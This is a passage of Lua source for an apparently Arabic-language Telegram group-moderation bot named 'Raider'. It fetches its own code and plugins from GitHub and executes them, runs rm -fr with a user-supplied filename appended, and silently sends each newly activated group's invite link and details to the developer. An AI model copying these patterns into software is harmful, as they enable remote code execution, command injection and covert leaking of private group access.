return false
end
end
if Dev_Raider(msg) then
if text == "تحديث الملفات 🔁" then
dofile("Raider.lua")  
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث ملفات البوت")
elseif text == "تحديث" then
dofile("Raider.lua")  
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث ملفات البوت")
elseif text == 'تحديث السورس 🔂' then
download_to_file('https://raw.githubusercontent.com/RSAIED/RAIDER/master/Raider.lua','Raider.lua') 
download_to_file('https://raw.githubusercontent.com/RSAIED/RAIDER/master/Script.lua','Script.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
elseif text == 'تحديث السورس' then
download_to_file('https://raw.githubusercontent.com/RSAIED/RAIDER/master/Raider.lua','Raider.lua') 
download_to_file('https://raw.githubusercontent.com/RSAIED/RAIDER/master/Script.lua','Script.lua') 
send(msg.chat_id_, msg.id_, "🔂┇تم تحديث السورس وتنزيل اخر تحديث للملفات")
end
if text == 'الملفات' then
Files = '\n🗂┇الملفات المفعله في البوت : \n ━━━━━━━━━━━━━\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..'*'..i..': * `'..v..'`\n'
end
end
if i == 0 then
Files = '⚠┇ لا توجد ملفات في البوت '
end
send(msg.chat_id_, msg.id_,Files)
elseif text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/RSAIED/RaiderCli/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
if Get_info then
local TextS = "\n📦┇قائمه ملفات متجر سورس ريدر\n💢┇الملفات المتوفره حاليا\n━━━━━━━━━━━━━\n\n"
local TextE = "\n━━━━━━━━━━━━━\n☑┇علامة ← {✔} تعني الملف مفعل\n☑┇علامة ← {❌} تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local Check_File_is_Found = io.open("Files/"..name,"r")
if Check_File_is_Found then
io.close(Check_File_is_Found)
CeckFile = "{✔}"
else
CeckFile = "{✖}"
end
NumFile = NumFile + 1
TextS = TextS..'*'..NumFile.." : * `"..name..'` → '..CeckFile..'\n[- اضغط لرئية معلومات الملف]('..Info..')\n'
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"⚠┇ لا يوجد اتصال من ال api") 
end
elseif text == "مسح جميع الملفات" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"💢┇تم مسح جميع ملفات المفعله")
elseif text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local File_Get = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local File_Name = File_Get[2]..'.lua'
local Get_Json, Res = https.request("https://raw.githubusercontent.com/RSAIED/RaiderCli/master/plugins_/"..File_Name)
if Res == 200 then
os.execute("rm -fr Files/"..File_Name)
send(msg.chat_id_, msg.id_,"\n🗂┇الملف ← *"..File_Name.."*\n☑┇تم تعطيله وحذفه من البوت بنجاح") 
dofile('Raider.lua')  
else
send(msg.chat_id_, msg.id_,"📂┇لا يوجد ملف بهاذا الاسم") 
end
elseif text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local File_Get = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local File_Name = File_Get[2]..'.lua'
local Get_Json, Res = https.request("https://raw.githubusercontent.com/RSAIED/RaiderCli/master/plugins_/"..File_Name)
if Res == 200 then
local ChekAuto = io.open("Files/"..File_Name,'w+')
ChekAuto:write(Get_Json)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n🗂┇الملف ← *"..File_Name.."*\n☑┇تم تفعيله في البوت بنجاح") 
dofile('Raider.lua')  
else
send(msg.chat_id_, msg.id_,"📂┇لا يوجد ملف بهاذا الاسم") 
end
return false
end
end
------------------------------------------------------------------------------------------------------------
if text and not redis:get(bot_id.."Status:Reply:Sudo"..msg.chat_id_) then
if not redis:sismember(bot_id..'Spam_For_Bot'..msg.sender_user_id_,text) then
local anemi = redis:get(bot_id.."Add:Rd:Sudo:Gif"..text)   
local veico = redis:get(bot_id.."Add:Rd:Sudo:vico"..text)   
local stekr = redis:get(bot_id.."Add:Rd:Sudo:stekr"..text)     
local Text = redis:get(bot_id.."Add:Rd:Sudo:Text"..text)   
local photo = redis:get(bot_id.."Add:Rd:Sudo:Photo"..text)
local video = redis:get(bot_id.."Add:Rd:Sudo:Video"..text)
local document = redis:get(bot_id.."Add:Rd:Sudo:File"..text)
local audio = redis:get(bot_id.."Add:Rd:Sudo:Audio"..text)
if Text then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,data)
local NumMsg = redis:get(bot_id..'Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 0
local TotalMsg = Total_message(NumMsg)
local Status_Gps = Get_Rank(msg.sender_user_id_,msg.chat_id_)
local NumMessageEdit = redis:get(bot_id..'Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
local Text = Text:gsub('#username',(data.username_ or 'لا يوجد')) 
local Text = Text:gsub('#name',data.first_name_)
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',NumMessageEdit)
local Text = Text:gsub('#msgs',NumMsg)
local Text = Text:gsub('#stast',Status_Gps)
send(msg.chat_id_, msg.id_,Text)
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end,nil)
end
if stekr then 
sendSticker(msg.chat_id_,msg.id_,stekr) 
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_,veico,"")
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_,video,"")
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if anemi then 
sendAnimation(msg.chat_id_, msg.id_,anemi,"")   
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, document)     
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_,msg.id_,photo,"")
redis:sadd(bot_id.."Spam_For_Bot"..msg.sender_user_id_,text) 
end  
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id..'Set:Cmd:Start:Bots') then
if text == 'الغاء ✖' then   
send(msg.chat_id_, msg.id_,"⚠┇تم الغاء حفظ كليشه امر /start") 
redis:del(bot_id..'Set:Cmd:Start:Bots') 
return false
end
redis:set(bot_id.."Set:Cmd:Start:Bot",text)  
send(msg.chat_id_, msg.id_,'☑┇تم حفظ كليشه امر /start في البوت') 
redis:del(bot_id..'Set:Cmd:Start:Bots') 
return false
end
------------------------------------------------------------------------------------------------------------
end
------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and DeveloperBot(msg) then
local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Raider.Info_Raider ~= true then
send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
return false 
end 
if TypeForChat ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'🚸┇البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Num:Add:Bot') or 0) and not Dev_Raider(msg) then
send(msg.chat_id_, msg.id_,'⚠┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Num:Add:Bot') or 0)..'* عضو')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if redis:sismember(bot_id..'ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
else
Send_Options(msg,result.id_,'reply_Add','〽┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'ChekBotAdd',msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local NumMember = data.member_count_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Raider(msg) then
sendText(Id_Dev,'☑┇تم تفعيل مجموعه جديده\n'..'\n💢┇بواسطة : '..Name..''..'\n🔖┇ايدي المجموعه : `'..IdChat..'`'..'\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*'..'\n📛┇اسم المجموعه : ['..NameChat..']'..'\n〽┇الرابط : ['..LinkGp..']',0,'md')
end
end
end,nil) 
end,nil) 
end,nil)
end
------------------------------------------------------------------------------------------------------------
if text == 'تعطيل' and DeveloperBot(msg) then
local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Raider.Info_Raider ~= true then
send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
return false 
end 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
if not redis:sismember(bot_id..'ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇المجموعه بالتاكيد معطله')
else
Send_Options(msg,result.id_,'reply_Add','〽┇تم تعطيل مجموعه '..chat.title_..'')
redis:srem(bot_id..'ChekBotAdd',msg.chat_id_)  
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = chat.title_
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub('"',"") 
NameChat = NameChat:gsub("`","") 
NameChat = NameChat:gsub("*","") 
NameChat = NameChat:gsub("{","") 
NameChat = NameChat:gsub("}","") 
local IdChat = msg.chat_id_
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if linkgpp.ok == true then 
LinkGp = linkgpp.result
else
LinkGp = 'لا يوجد'
end
if not Dev_Raider(msg) then
sendText(Id_Dev,'☑┇تم تعطيل مجموعه جديده\n'..'\n💢┇بواسطة : '..Name..''..'\n🔖┇ايدي المجموعه : `'..IdChat..'`\n📛┇اسم المجموعه : ['..NameChat..']',0,'md')
end
end
end,nil) 
end,nil) 
end
------------------------------------------------------------------------------------------------------------
if text == 'تفعيل' and not DeveloperBot(msg) and not redis:get(bot_id..'Free:Bot') then
local url,res = http.request('http://raider.ml/ch/?id='..msg.sender_user_id_)
data = JSON.decode(url)
if data.Ch_Raider.Info_Raider ~= true then
send(msg.chat_id_,msg.id_,'\n📌┇عليك الاشتراك في قناة البوت \n💢┇قناة البوت ← { @RaiderCli }')   
return false 
end 
if TypeForChat ~= 'ForSuppur' then
send(msg.chat_id_, msg.id_,'⚠┇المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي') 
return false
end
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'⚠┇البوت ليس ادمن يرجى ترقيتي') 
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,chat)  
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,DataChat) 
if DataChat and DataChat.status_.ID == "ChatMemberStatusEditor" or DataChat and DataChat.status_.ID == "ChatMemberStatusCreator" then
if DataChat and DataChat.user_id_ == msg.sender_user_id_ then
if DataChat.status_.ID == "ChatMemberStatusCreator" then
Status_Rt = 'المنشئ'
elseif DataChat.status_.ID == "ChatMemberStatusEditor" then
Status_Rt = 'الادمن'
else 
Status_Rt = 'عضو'
end
if redis:sismember(bot_id..'ChekBotAdd',msg.chat_id_) then
send(msg.chat_id_, msg.id_,'⚡┇تم تفعيل المجموعه مسبقا')
return false
end
if tonumber(data.member_count_) < tonumber(redis:get(bot_id..'Num:Add:Bot') or 0) and not Dev_Raider(msg) then
send(msg.chat_id_, msg.id_,'⚠┇لا تستطيع تفعيل المجموعه بسبب قلة عدد اعضاء المجموعه يجب ان يكون اكثر من *:'..(redis:get(bot_id..'Num:Add:Bot') or 0)..'* عضو')
return false
end
Send_Options(msg,msg.sender_user_id_,'reply_Add','〽┇تم تفعيل مجموعه '..chat.title_..'')
redis:sadd(bot_id..'ChekBotAdd',msg.chat_id_)  
redis:sadd(bot_id..'President:Group'..msg.chat_id_, msg.sender_user_id_)
local LinkApi = json:decode(https.request('https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkApi.ok == true then 
LinkChat = LinkApi.result
else
LinkChat = 'لا يوجد'
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMember = data.member_count_
local NameChat = chat.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
if not Dev_Raider(msg) then
sendText(Id_Dev,'☑┇تم تفعيل مجموعه جديده\n💢┇بواسطة : '..Name..'\n🚸┇موقعه في المجموعه : '..Status_Rt..'\n🔖┇ايدي المجموعه : `'..msg.chat_id_..'`\n👥┇عدد اعضاء المجموعه *: '..NumMember..'*\n📛┇اسم المجموعه : ['..NameChat..']\n〽┇الرابط : ['..LinkChat..']',0,'md')
end
end
end
end,nil)   
end,nil) 
end,nil) 
end,nil) 
end
------------------------------------------------------------------------------------------------------------
end
end
------------------------------------------------------------------------------------------------------------
function tdcli_update_callback(data)
if data.ID == ("UpdateChannel") then 
if data.channel_.status_.ID == ("ChatMemberStatusKicked") then 
redis:srem(bot_id..'ChekBotAdd','-100'..data.channel_.id_)  
end
elseif data.ID == ("UpdateNewMessage") then
msg = data.message_
text = msg.content_.text_
if msg.date_ and msg.date_ < tonumber(os.time() - 30) then
print("->> Old Message End <<-")
return false
end
------------------------------------------------------------------------------------------------------------
tdcli_function({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
redis:set(bot_id..'Save:Username'..msg.sender_user_id_,data.username_)
end;end,nil)   
--------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
local NewCmmd = redis:get(bot_id.."Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
if NewCmmd then
redis:del(bot_id.."Get:Reides:Commands:Group"..msg.chat_id_..":"..text)
redis:del(bot_id.."Command:Reids:Group:New"..msg.chat_id_)
redis:srem(bot_id.."Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"☑┇تم ازالة هاذا ← { "..text.." }")  
else
send(msg.chat_id_, msg.id_,"⚠┇لا يوجد امر بهاذا الاسم")  
end
redis:del(bot_id.."Command:Reids:Group:Del"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_) == "true" then
redis:set(bot_id.."Command:Reids:Group:New"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"〽┇ارسل الامر الجديد ليتم وضعه مكان القديم")  
redis:del(bot_id.."Command:Reids:Group"..msg.chat_id_..":"..msg.sender_user_id_)
redis:set(bot_id.."Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_,"true1") 
return false
end
------------------------------------------------------------------------------------------------------------
if text and redis:get(bot_id.."Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_) == "true1" then
local NewCmd = redis:get(bot_id.."Command:Reids:Group:New"..msg.chat_id_)
redis:set(bot_id.."Get:Reides:Commands:Group"..msg.chat_id_..":"..text,NewCmd)
redis:sadd(bot_id.."Command:List:Group"..msg.chat_id_,text)
send(msg.chat_id_, msg.id_,"☑┇تم حفظ الامر باسم ← { "..text..' }')  
redis:del(bot_id.."Command:Reids:Group:End"..msg.chat_id_..":"..msg.sender_user_id_)
return false
end
------------------------------------------------------------------------------------------------------------
if tonumber(msg.sender_user_id_) ~= tonumber(bot_id) then  
if msg.sender_user_id_ and RemovalUserGroup(msg.chat_id_,msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false  
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroup(msg.chat_id_,msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false
elseif msg.sender_user_id_ and RemovalUserGroups(msg.sender_user_id_) then 
KickGroup(msg.chat_id_,msg.sender_user_id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_}) 
return false 
elseif msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and RemovalUserGroups(msg.content_.members_[0].id_) then 
KickGroup(msg.chat_id_,msg.content_.members_[0].id_) 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
elseif msg.sender_user_id_ and MutedGroups(msg.chat_id_,msg.sender_user_id_) then 
Delete_Message(msg.chat_id_, {[0] = msg.id_})  
return false  
end
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == "MessagePinMessage" or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == "MessageChatChangeTitle" or msg.content_.ID == "MessageChatDeleteMember" then   
if redis:get(bot_id.."Status:Lock:tagservr"..msg.chat_id_) then  
Delete_Message(msg.chat_id_,{[0] = msg.id_})       
return false
end    
elseif text and not redis:sismember(bot_id..'Spam_For_Bot'..msg.sender_user_id_,text) then
redis:del(bot_id..'Spam_For_Bot'..msg.sender_user_id_) 
elseif msg.content_.ID == "MessageChatAddMembers" then  
redis:set(bot_id.."Who:Added:Me"..msg.chat_id_..":"..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Status:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
elseif msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = redis:get(bot_id.."Status:Lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Admin(msg) and Bots == "del" then   
Get_Info = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(Get_Info)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_}) tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_Admin(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
Dev_Raider_File(msg,data)
FilesRaider(msg)
FilesRaiderBot(msg)
elseif data.ID == ("UpdateMessageEdited") then
tdcli_function ({ID = "GetMessage",chat_id_ = data.chat_id_,message_id_ = tonumber(data.message_id_)},function(extra, result, success)
local textedit = result.content_.text_
redis:incr(bot_id..'Num:Message:Edit'..result.chat_id_..result.sender_user_id_)
if redis:get(bot_id.."Status:Lock:edit"..msg.chat_id_) and not textedit and not PresidentGroup(result) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
Send_Options(result,result.sender_user_id_,"reply","⚠┇قام بالتعديل على الميديا")  
end
if not Vips(result) then
------------------------------------------------------------------------
if textedit and textedit:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt].[Mm][Ee]") or textedit and textedit:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("[hH][tT][tT][pP][sT]") or textedit and textedit:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or textedit and textedit:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if redis:get(bot_id.."Status:Lock:Link"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(@)(.*)") then
if redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("@") then
if redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("(.*)(#)(.*)") then
if redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("#") then
if redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end  
elseif textedit and textedit:match("/") then
if redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit and textedit:match("(.*)(/)(.*)") then
if redis:get(bot_id.."Status:Lock:Cmd"..msg.chat_id_) then
Delete_Message(result.chat_id_,{[0] = data.message_id_}) 
return false
end 
elseif textedit then
local Text_Filter = redis:get(bot_id.."Filter:Reply2"..textedit..result.chat_id_)   
if Text_Filter then    
Delete_Message(result.chat_id_, {[0] = data.message_id_})     
Send_Options(result,result.sender_user_id_,"reply","⚠┇"..Text_Filter)  
return false
end
end
end
end,nil)
elseif data.ID == ("UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = redis:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;redis:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) redis:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
